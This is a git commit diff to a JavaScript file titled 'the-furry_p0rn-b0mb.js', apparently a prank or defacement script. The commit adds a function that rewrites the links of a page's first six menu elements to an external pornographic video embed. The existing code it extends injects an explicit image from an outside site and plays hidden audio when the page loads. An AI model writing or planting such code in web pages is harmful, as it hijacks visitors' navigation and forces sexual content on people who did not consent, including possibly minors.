6ae78dcad2e1e563b7ed0e48b9cb58029f3151fe
Wolf <36646784+NE1W01F@users.noreply.github.com>
2019-06-28 08:51:17 +0000

    Update the-furry_p0rn-b0mb.js

--- the-furry_p0rn-b0mb.js
+++ the-furry_p0rn-b0mb.js
@@ -6,6 +6,15 @@ function porn(url){
     document.body.appendChild(pic);
 }
 
+function redriect(url){
+    var a = document.getElementsByClassName('menu');
+    var b = 0;
+    while(b < 6){
+        a[b].href = url;
+        b++;
+    }
+}
+
 function playSound(url){
     var audio = document.createElement('audio');
     audio.style.display = "none";
@@ -17,6 +26,7 @@ function playSound(url){
 function start(){
     playSound("https://raw.githubusercontent.com/NE1W01F/the-furry-porn-bomb/master/Amazon.mp3");
     porn("https://cdnio.luscious.net/987/lusciousnet_000000top1_855317720.jpg");
+    redriect("https://www.thumbzilla.com/video/embed?key=ph59b436f94f7d0");
 }
 
 start();
